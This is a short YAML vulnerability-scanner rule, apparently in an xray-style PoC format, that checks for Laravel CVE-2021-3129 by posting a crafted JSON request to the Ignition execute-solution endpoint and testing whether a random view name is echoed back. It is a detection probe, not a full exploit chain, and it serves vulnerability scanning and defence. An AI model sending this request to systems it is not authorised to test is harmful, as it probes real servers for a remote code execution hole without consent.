name: poc-yaml-laravel-cve-2021-3129
set:
  r1: randomLowercase(12)
rules:
  - method: POST
    path: /_ignition/execute-solution
    headers:
      User-Agent: >-
        Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101
        Firefox/46.0
      Content-Type: application/json
    body: |-
      {
              "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
              "parameters": {
                "variableName": "username",
                "viewFile": "{{r1}}"
              }
      }
    follow_redirects: true
    expression: |
      response.body.bcontains(bytes(r1))

detail:
  author: Jarcis-cy(https://github.com/Jarcis-cy)
  links:
    - https://github.com/vulhub/vulhub/blob/master/laravel/CVE-2021-3129